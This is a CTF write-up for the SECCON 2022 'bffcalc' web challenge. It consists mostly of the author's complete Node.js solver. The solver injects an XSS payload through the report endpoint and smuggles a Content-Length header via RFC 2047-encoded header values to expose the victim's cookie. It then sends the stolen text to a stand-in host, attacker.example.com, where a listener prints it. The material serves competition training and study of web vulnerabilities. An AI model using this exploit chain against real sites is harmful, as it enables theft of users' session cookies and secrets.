---
title: "Bffcalc - SECCON CTF 2022 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "nginx", "bffcalc", "web", "seccon-ctf-2022-quals"]
summary: "There is a simple calculator!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/bffcalc"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Bffcalc"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/bffcalc>
- **CTF:** SECCON CTF 2022 Quals

---

# [web] bffcalc

## Description

There is a simple calculator!

- `http://bffcalc.seccon.games:3000`

## Attachments

- [bffcalc](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_BASE_URL=http://localhost:3000 \
    -e ATTACK_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/bffcalc/solver/index.js>

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const encode = (bs) => {
    // ref. https://www.rfc-editor.org/rfc/rfc2047.html#section-2
    charset = "iso-8859-1";
    encoding = "q";
    encoded_text = Array.from(Buffer.from(bs))
      .map((x) => "=" + Buffer.from([x]).toString("hex"))
      .join("");
    return `=?${charset}?${encoding}?${encoded_text}?=`;
  };

  const contentLength =
    "Accept: */*\r\nReferer: http://nginx:3000/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: "
      .length;
  const evilHeader = encode(`bbb\r\nContent-Length: ${contentLength}\r\n`);

  const evilJs = `
    const main = async () => {
      document.cookie = '/?a=b HTTP/1.1';

      const res = await fetch('/api?expr=1', {
        method: 'GET',
        headers: {
          'aaa': '${evilHeader}',
        },
      });
      location = '${ATTACK_BASE_URL}/?text=' + encodeURIComponent(await res.text());
    };
    main();
  `.replaceAll("\n", "");
  if (evilJs.includes('"')) {
    fail("Invalid evilJs");
  }

  const xssPayload = `<img src=0 onerror="${evilJs}">`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        expr: xssPayload,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const text = req.query.text;
    console.log(text); // Print a flag

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(2 * 1000);
      await exploit();

      await sleep(10 * 1000);
      console.log("Failed");
      process.exit(1);
    }
  );
};
start();
```
